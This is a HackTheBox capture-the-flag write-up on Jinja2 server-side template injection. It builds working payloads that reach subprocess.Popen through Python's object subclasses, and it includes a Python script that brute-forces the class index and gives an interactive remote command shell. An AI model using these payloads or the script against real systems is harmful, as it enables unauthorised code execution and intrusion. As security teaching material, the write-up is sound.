---
title: HackTheBox - Templated
date: 2022-05-13 21:30:00
categories: [HackTheBox, Challenges]
tags: [hackthebox, templated, ssti, jinja2, scripting, python]     # TAG names should always be lowercase
img_path: /assets/img/HackTheBox/Templated
---
SSTI or Server-Side Template Injection is a vulnerability that always really confused me but at the same time, really
interested me. Add those together and I went about finding out how it worked.<br>

Templating is a way in which developers can take dynamic data from a source and incorporate it into the page. It does
this by having placeholder variables written statically in the source and then having those variables replaced with
the dynamic data such as user input.<br>

In the case of Jinja2, these templates would be written in a way for the formatting engine to use them, such as in
the case of a 404 page:<br>
`The page{% raw %} {{'directory'}} {% endraw %}could not be found`<br>
Would render as:<br>
`The page 'AAAAA' could not be found`<br>

SSTI can occur when user input is concatenated into a template render rather than safely passed into the template.
This allows the user to render their own "templates".<br>

This is what is presumably happening in HackTheBox Templated. With a name like Templated and the only text on the
page referencing an under construction Jinja2 site, the vulnerability isn't exactly hiding.

![Jinja2](templated_jinja2.png "Jinja2")
_Jinja2_

Requesting a random directory, we see it is reflected back into the 404 page.

![404](templated_404.png "404")
_404_

We know it's running Jinja2, we can try and request `{%raw%}{{7 * 7}}{%endraw%}` to see if we can inject our own
"template".

![49](templated_49.png "49")
_Jinja2 SSTI_

Now it gets interesting. We have SSTI. Time to build a payload to get RCE on the container. In Python, everything
is an object and so everything involved in the Jinja2 server is accessible by bouncing around to different objects.<br>

For the first payload, we can bounce back a step to the `string` object by requesting:<br>
```
{%raw%}{{"1337.__class__"}}{%endraw%}
```

![class str](templated_classstr.png "class str")
_'<class 'str'>'_

Now that we're in the `'<class 'str'>'` object, we can take another step back to the base of the string object with:<br>
```
{%raw%}{{"1337".__class__.__base__}}{%endraw%}
```

![class object](templated_object.png "class object")
_'<class 'object'>'_

Now we're at the origin, since everything in Python is an object, everything inherits from this object meaning we can
bounce around anywhere we want. We can stop taking steps back and instead take a step forward into a subclass that'll 
allow us to execute commands. In order to enter the subclass we want, we first must list what subclasses are available 
for use:<br>
```
{%raw%}{{"1337".__class__.__base__.__subclasses__()}}{%endraw%}
```

![subclasses](templated_subclasses.png "subclasses")
_That's a lot of subclasses_

`Control + F` is your friend. We can use it to search for classes that'll help us out. In this instance, we can target
`subprocess.Popen`. This operates like a regular Python list. We need to find the index of `subprocess.Popen` in this
list. I'll go over how I found it later, but for now, it's `[414]`:<br>
```
{%raw%}{{"1337".__class__.__base__.__subclasses__()[414]}}{%endraw%}
```

![subprocess](templated_subprocess.png "subprocess")
_subprocess.Popen_

Now that we're right where we want to be. We can achieve RCE with this final payload:<br>
```
{%raw%}{{"1337".__class__.__base__.__subclasses__()[414]('cat flag.txt', shell=True, stdout=-1).communicate()[0]}}{%endraw%}
```


![solved](templated_solved.png "solved")
_Flag_

Now, we've solved the challenge but that's only half the fun. I'm now going to move onto making a nice script to
interact with the RCE. This script also includes how I found the index of `subprocess.Popen`.

---
# Script

The first half of the script will find the index of `subprocess.Popen`. In the interest of not slamming the challenge
with ~600 requests to find the index, I ballparked it around 400 - 500. It then simply checked for `subprocess.Popen`
in all of them and if it finds it, it sets the index in the URL for the second half of the script. You could easily 
hardcode the index after running it once and scrap this part of the script, but there's no fun in that.
{%raw%}
```python
#!/bin/env python3

import requests

challenge = ""

print("[+] Finding Subprocess...")

for i in range(400,500):
	challenge = "http://IP:PORT/{{'abc'.__class__.__base__.__subclasses__()[%s]}}" %i
	r = requests.get(challenge)
	if "subprocess.Popen" in r.text:
		print("[+] Subprocess Found at [{}]".format(i))
		break
```

Now that we have the index of `subprocess.Popen`, we can write the part of the script that'll interact with it in a
terminal-like interface.

```python
print("[+] Spawning Shell...")

while True:
	try:
		command = input("Path-IX> ")
		shell = challenge[:-2] + "('%s', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}" %command
		r = requests.get(shell)
		print("----------\n"+r.text[38:-30]+"\n----------")
	except KeyboardInterrupt:
		print("\n[+] Quitting...")
		quit()
```


Here it simply sets the RCE payload to whatever command is inputted and keeps it open in a constant loop until
KeyboardInterrupt. Added on some extra cleanup at the end of the payload to decode the output and I used
Python slices to cut down on the returned 404 message etc. The most satisfying part of writing a script isn't 
getting it working, it's making it look nice.


![Path-IX](templated_rce.png "Path-IX")
_Shell?_

Full script:
```python
#!/bin/env python3

import requests
challenge = ""

print("[+] Finding Subprocess...")

for i in range(400,500):
	challenge = "http://IP:PORT/{{'abc'.__class__.__base__.__subclasses__()[%s]}}" %i
	r = requests.get(challenge)
	if "subprocess.Popen" in r.text:
		print("[+] Subprocess Found at [{}]".format(i))
		break

print("[+] Spawning Shell...")

while True:
	try:
		command = input("Path-IX> ")
		shell = challenge[:-2] + "('%s', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}" %command
		r = requests.get(shell)
		print("----------\n"+r.text[38:-30]+"\n----------")
	except KeyboardInterrupt:
		print("\n[+] Quitting...")
		quit()
```
{%endraw%}
# :)
